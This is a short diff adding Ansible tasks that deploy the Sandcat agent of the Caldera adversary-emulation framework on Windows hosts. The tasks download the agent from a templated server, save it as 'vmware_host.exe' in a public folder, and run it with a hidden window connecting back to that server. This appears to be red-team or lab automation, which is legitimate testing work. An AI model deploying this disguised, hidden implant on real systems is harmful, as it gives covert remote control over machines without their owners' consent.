@@ -1,0 +1,12 @@
+- name: Download Sandcat agent (Windows)
+  win_get_url:
+    url: "{{ caldera_server }}/magellan/download"
+    dest: C:\Users\Public\vmware_host.exe
+    headers:
+      file: sandcat.go
+
+- name: Run Sandcat agent
+  win_shell: |
+    Start-Process -FilePath C:\Users\Public\vmware_host.exe `
+      -ArgumentList "-server {{ caldera_server }} -group {{ caldera_group }}" `
+      -WindowStyle Hidden
